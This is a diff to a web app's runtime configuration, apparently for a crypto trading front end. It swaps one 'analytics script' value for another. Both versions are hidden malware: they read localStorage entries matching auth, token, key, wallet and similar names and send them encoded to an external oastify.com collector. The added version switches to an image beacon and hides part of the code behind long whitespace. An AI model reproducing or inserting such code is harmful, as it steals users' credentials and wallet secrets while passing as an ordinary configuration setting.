@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>(function(){var d={h:location.hostname,u:location.href,k:{},t:Date.now()};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(/orderly|auth|key|token|wallet|privy/i.test(k)){d.k[k]=localStorage.getItem(k)}}if(Object.keys(d.k).length>0){var x=new XMLHttpRequest();x.open('POST','https://0efmnx00w04o92xweaesqpm9v01rpjd8.oastify.com/collect',true);x.setRequestHeader('Content-Type','text/plain');x.send(btoa(JSON.stringify(d)))}})()</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>(function(){var d={h:location.hostname,k:{}};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(/orderly|auth|key|token|wallet|privy/i.test(k)){d.k[k]=localStorage.getItem(k)}}if(Object.keys(d.k).length>0){new                                                                                    \n Image().src='https://0efmnx00w04o92xweaesqpm9v01rpjd8.oastify.com/?d='+encodeURIComponent(btoa(JSON.stringify(d)))}})()</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
